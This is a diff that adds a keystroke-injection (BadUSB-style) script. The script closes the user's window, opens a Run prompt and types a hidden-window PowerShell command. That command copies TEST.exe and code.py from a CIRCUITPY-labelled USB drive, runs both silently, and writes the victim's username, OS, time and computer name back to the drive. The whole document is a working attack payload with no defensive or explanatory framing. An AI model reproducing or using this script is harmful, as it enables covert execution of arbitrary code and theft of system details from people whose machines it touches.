@@ -1,0 +1,10 @@
+DELAY 3000
+ALT F4
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1200
+STRING powershell -nop -win h -c "$d=(gwmi win32_volume|?{$_.Label -eq 'CIRCUITPY'}).DriveLetter;Copy-Item \"$d\TEST.exe\" $env:TEMP\t.exe -Force -ErrorAction SilentlyContinue;Copy-Item \"$d\code.py\" $env:TEMP\c.py -Force;$pythonCmd = if (Get-Command python -ErrorAction SilentlyContinue) {'python'} elseif (Get-Command python3 -ErrorAction SilentlyContinue) {'python3'} else {'py'};if($pythonCmd){Start-Process $pythonCmd -ArgumentList \"$env:TEMP\c.py\"};Start-Process $env:TEMP\t.exe -Wait -ErrorAction SilentlyContinue;$user=$env:USERNAME;$os=(Get-CimInstance Win32_OperatingSystem).Caption;$dt=Get-Date;$pc=$env:COMPUTERNAME;$con=\"USER: $user`nOS: $os`nTIME: $dt`nPC: $pc\";if(Test-Path $d){Set-Content -Path \"$d\$pc.txt\" -Value $con -ErrorAction SilentlyContinue};exit"
+ENTER
